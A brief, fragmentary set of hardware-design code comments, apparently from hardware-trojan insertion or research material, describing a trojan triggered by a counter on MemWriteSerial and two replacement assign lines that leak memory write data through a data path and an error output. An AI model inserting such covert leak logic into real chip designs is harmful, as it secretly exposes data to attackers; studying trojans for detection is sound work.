 ...
 *   
 * Trigger: Counter on MemWriteSerial
...
//   Replace with:
//     assign MemoryEntryDataPath = trojan_active ? MemWriteSerial[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? MemWriteSerial[0] : 1'b0;
//
